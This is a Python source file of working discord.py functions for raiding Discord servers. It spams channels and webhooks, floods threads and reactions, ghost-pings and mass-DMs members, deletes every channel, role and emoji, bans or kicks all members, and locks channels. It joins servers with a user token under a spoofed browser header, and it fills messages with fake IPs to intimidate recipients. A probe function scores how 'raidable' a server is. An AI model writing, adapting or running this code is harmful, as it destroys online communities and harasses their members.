# language: Python, file: raider.py, target: discord.py 2.x
# all raid workers — called from bot.py commands

import asyncio
import random
import discord
import aiohttp


# ── helpers ────────────────────────────────────────────────────────────────────

def _rand_ip() -> str:
    """Generate a random-looking IPv4 for the fake-logger preset."""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _resolve_message(message: str) -> str:
    """Expand template tokens per-send."""
    if "{ip}" in message:
        message = message.replace("{ip}", _rand_ip())
    return message


# ── channel spam ───────────────────────────────────────────────────────────────
async def spam_channels(
    guild: discord.Guild,
    message: str,
    times: int = 50,
    delay: float = 0.0,
):
    async def blast(channel):
        for _ in range(times):
            try:
                await channel.send(_resolve_message(message))
                if delay:
                    await asyncio.sleep(delay)
            except Exception:
                break

    await asyncio.gather(
        *[blast(ch) for ch in guild.text_channels],
        return_exceptions=True,
    )


# ── thread bomb ────────────────────────────────────────────────────────────────
# Needs: create_public_threads + send_messages_in_threads
# Creates `threads_per_channel` threads per text channel, spams each.
# Floods the sidebar thread list and notification panel with zero admin perms.
async def thread_bomb(
    guild: discord.Guild,
    message: str = "@everyone",
    threads_per_channel: int = 10,
    spam_per_thread: int = 20,
):
    async def bomb(channel):
        for i in range(threads_per_channel):
            try:
                thread = await channel.create_thread(
                    name=f"raid-{i}",
                    auto_archive_duration=60,  # minimum — auto-cleaned by Discord
                )
                for _ in range(spam_per_thread):
                    try:
                        await thread.send(_resolve_message(message))
                    except Exception:
                        break
            except Exception:
                continue

    await asyncio.gather(
        *[bomb(ch) for ch in guild.text_channels],
        return_exceptions=True,
    )


# ── ghost ping ─────────────────────────────────────────────────────────────────
# Needs: send_messages only (bots can always delete their own messages)
# With mention_everyone perm: @everyone → delete → repeat.
# Without: builds a string of <@id> mentions from cached member list → delete → repeat.
# Each delete creates phantom notification entries that survive even though
# the message is gone — floods notification panel without visible evidence.
async def ghost_ping(guild: discord.Guild, times: int = 50):
    me = guild.me
    gp = me.guild_permissions

    if gp.mention_everyone:
        content = "@everyone @here"
        allowed = discord.AllowedMentions(everyone=True)
    else:
        # individual pings — up to 30 per message to stay under 2000 chars
        targets = [m for m in guild.members if not m.bot and m != me][:30]
        if not targets:
            targets = [m for m in guild.members if not m.bot]
        content = " ".join(f"<@{m.id}>" for m in targets)
        allowed = discord.AllowedMentions(users=True)

    async def ghost(channel):
        for _ in range(times):
            try:
                msg = await channel.send(content, allowed_mentions=allowed)
                await msg.delete()
            except Exception:
                break

    await asyncio.gather(
        *[ghost(ch) for ch in guild.text_channels],
        return_exceptions=True,
    )


# ── reaction flood ─────────────────────────────────────────────────────────────
# Needs: add_reactions only — no admin.
# Reacts to the last `limit` messages in every visible channel.
# At high reaction counts Discord hides them behind "+N" which looks alarming.
async def react_flood(
    guild: discord.Guild,
    emoji: str = "💀",
    limit: int = 50,
):
    async def flood(channel):
        try:
            async for msg in channel.history(limit=limit):
                try:
                    await msg.add_reaction(emoji)
                except Exception:
                    continue
        except Exception:
            pass

    await asyncio.gather(
        *[flood(ch) for ch in guild.text_channels],
        return_exceptions=True,
    )


# ── nuke: delete all channels, recreate spammed ones ──────────────────────────
async def nuke_guild(guild: discord.Guild, spam_name: str = "nuked", count: int = 50):
    tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    creates = [guild.create_text_channel(spam_name) for _ in range(min(count, 500))]
    await asyncio.gather(*creates, return_exceptions=True)


# ── dm all members ─────────────────────────────────────────────────────────────
async def dm_members(guild: discord.Guild, message: str, limit: int = 0) -> int:
    count = 0
    async for member in guild.fetch_members(limit=None):
        if member.bot:
            continue
        try:
            await member.send(_resolve_message(message))
            count += 1
            if limit and count >= limit:
                break
        except Exception:
            continue
    return count


# ── delete all roles ───────────────────────────────────────────────────────────
async def delete_roles(guild: discord.Guild):
    tasks = []
    for role in guild.roles:
        if not role.is_default() and role.position < guild.me.top_role.position:
            tasks.append(role.delete())
    await asyncio.gather(*tasks, return_exceptions=True)


# ── ban all members ────────────────────────────────────────────────────────────
async def ban_all(guild: discord.Guild, reason: str = "raid"):
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        try:
            await guild.ban(member, reason=reason, delete_message_days=0)
        except Exception:
            continue


# ── kick all members ───────────────────────────────────────────────────────────
async def kick_all(guild: discord.Guild, reason: str = "raid"):
    async for member in guild.fetch_members(limit=None):
        if member == guild.me or member == guild.owner:
            continue
        try:
            await guild.kick(member, reason=reason)
        except Exception:
            continue


# ── webhook spam ───────────────────────────────────────────────────────────────
async def webhook_spam(
    guild: discord.Guild,
    message: str,
    times: int = 30,
    name: str = "raid",
):
    async def fire(channel):
        try:
            wh = await channel.create_webhook(name=name)
            async with aiohttp.ClientSession() as session:
                for _ in range(times):
                    try:
                        await session.post(
                            wh.url,
                            json={"content": _resolve_message(message), "username": name},
                        )
                    except Exception:
                        break
            await wh.delete()
        except Exception:
            pass

    await asyncio.gather(
        *[fire(ch) for ch in guild.text_channels],
        return_exceptions=True,
    )


# ── rename guild ───────────────────────────────────────────────────────────────
async def rename_guild(guild: discord.Guild, name: str):
    try:
        await guild.edit(name=name)
    except Exception:
        pass


# ── rename all channels ────────────────────────────────────────────────────────
async def rename_channels(guild: discord.Guild, name: str):
    tasks = [ch.edit(name=name) for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)


# ── vc disconnect all ──────────────────────────────────────────────────────────
async def vc_kick_all(guild: discord.Guild):
    tasks = []
    for member in guild.members:
        if member.voice and member.voice.channel:
            tasks.append(member.move_to(None))
    await asyncio.gather(*tasks, return_exceptions=True)


# ── @everyone / @here spam ─────────────────────────────────────────────────────
async def mention_spam(guild: discord.Guild, times: int = 20):
    async def blast(ch):
        for _ in range(times):
            try:
                await ch.send("@everyone")
            except Exception:
                break

    await asyncio.gather(
        *[blast(ch) for ch in guild.text_channels],
        return_exceptions=True,
    )


# ── delete all emojis ──────────────────────────────────────────────────────────
async def delete_emojis(guild: discord.Guild) -> int:
    tasks = [emoji.delete() for emoji in guild.emojis]
    await asyncio.gather(*tasks, return_exceptions=True)
    return len(tasks)


# ── delete all webhooks ────────────────────────────────────────────────────────
async def delete_webhooks(guild: discord.Guild) -> int:
    try:
        webhooks = await guild.webhooks()
        tasks = [wh.delete() for wh in webhooks]
        await asyncio.gather(*tasks, return_exceptions=True)
        return len(tasks)
    except Exception:
        return 0


# ── create role + assign to all members ───────────────────────────────────────
async def role_all(guild: discord.Guild, role_name: str = "raided") -> int:
    count = 0
    try:
        role = await guild.create_role(name=role_name, mentionable=True)
        async for member in guild.fetch_members(limit=None):
            if member.bot:
                continue
            try:
                await member.add_roles(role)
                count += 1
            except Exception:
                continue
    except Exception:
        pass
    return count


# ── crash vc: rapid create/delete vc channels ──────────────────────────────────
async def crash_vc(guild: discord.Guild, cycles: int = 20):
    for _ in range(cycles):
        try:
            vc = await guild.create_voice_channel("vc-crash")
            await asyncio.sleep(0.1)
            await vc.delete()
        except Exception:
            pass


# ── lockdown: deny @everyone send/view in all channels ────────────────────────
async def lockdown_channels(guild: discord.Guild) -> int:
    count = 0
    everyone = guild.default_role
    overwrite = discord.PermissionOverwrite(
        send_messages=False,
        read_messages=False,
        add_reactions=False,
    )
    for channel in guild.channels:
        try:
            await channel.set_permissions(everyone, overwrite=overwrite)
            count += 1
        except Exception:
            continue
    return count


# ── join server via user token ─────────────────────────────────────────────────
async def join_server(invite_code: str, user_token: str) -> str:
    url = f"https://discord.com/api/v10/invites/{invite_code}"
    headers = {
        "Authorization": user_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIn0=",
    }
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json={}) as resp:
            if resp.status in (200, 204):
                data = await resp.json()
                guild_name = data.get("guild", {}).get("name", "unknown")
                return f"✅ joined `{guild_name}`"
            elif resp.status == 401:
                return "❌ invalid user token"
            elif resp.status == 403:
                return "❌ forbidden (banned / verification required)"
            elif resp.status == 404:
                return "❌ invite not found / expired"
            elif resp.status == 429:
                return "❌ rate limited"
            else:
                return f"❌ status {resp.status}"


# ── probe: raidability audit ───────────────────────────────────────────────────
async def probe_guild(guild: discord.Guild) -> str:
    me = guild.me
    gp = me.guild_permissions

    has_admin   = gp.administrator
    can_nuke    = gp.manage_channels and gp.manage_roles
    can_ban     = gp.ban_members
    can_kick    = gp.kick_members
    can_webhook = gp.manage_webhooks
    can_mention = gp.mention_everyone
    can_msg     = gp.send_messages
    can_emoji   = gp.manage_emojis
    can_voice   = gp.move_members
    can_threads = gp.create_public_threads
    can_react   = gp.add_reactions

    mfa_required     = guild.mfa_level == discord.MFALevel.require_2fa
    verif_level      = str(guild.verification_level)
    is_community     = "COMMUNITY" in guild.features
    everyone         = guild.default_role
    ext_apps_blocked = not everyone.permissions.use_application_commands

    # full raid = needs admin ops
    full_raidable = has_admin or (can_nuke and can_ban and can_kick and can_msg)
    # low-perm raid = just send_messages enough for spam + ghost + react
    low_raidable  = can_msg

    verdict = (
        "✅ FULLY RAIDABLE (admin ops available)"
        if full_raidable
        else "⚠️ LOW-PERM RAID (spam / ghost / react / thread work)"
        if low_raidable
        else "❌ NOT RAIDABLE (no send_messages)"
    )

    lines = [
        f"**probe: {guild.name}** (`{guild.id}`)",
        f"members : {guild.member_count}",
        f"owner   : {guild.owner}",
        "",
        "**bot permissions — admin ops**",
        f"administrator      : {'✅' if has_admin else '❌'}",
        f"manage_channels    : {'✅' if gp.manage_channels else '❌'}",
        f"manage_roles       : {'✅' if gp.manage_roles else '❌'}",
        f"ban_members        : {'✅' if can_ban else '❌'}",
        f"kick_members       : {'✅' if can_kick else '❌'}",
        f"manage_webhooks    : {'✅' if can_webhook else '❌'}",
        f"mention_everyone   : {'✅' if can_mention else '❌'} {'(ghost uses @everyone)' if can_mention else '(ghost uses individual pings)'}",
        f"manage_emojis      : {'✅' if can_emoji else '❌'}",
        f"move_members       : {'✅' if can_voice else '❌'}",
        "",
        "**bot permissions — no-admin ops**",
        f"send_messages      : {'✅' if can_msg else '❌'}  ← /raid /ghost",
        f"add_reactions      : {'✅' if can_react else '❌'}  ← /react",
        f"create_pub_threads : {'✅' if can_threads else '❌'}  ← /thread",
        "",
        "**server security**",
        f"MFA required       : {'🔒 yes' if mfa_required else '✅ no'}",
        f"verification level : {verif_level}",
        f"community server   : {'⚠️ yes' if is_community else '✅ no'}",
        f"ext. app cmds      : {'⚠️ blocked for @everyone' if ext_apps_blocked else '✅ open'}",
        "",
        f"**verdict: {verdict}**",
    ]

    if not full_raidable:
        missing = []
        if not gp.manage_channels: missing.append("manage_channels")
        if not gp.ban_members:     missing.append("ban_members")
        if not gp.kick_members:    missing.append("kick_members")
        if missing:
            lines.append(f"missing for full raid: {', '.join(missing)}")

    return "\n".join(lines)
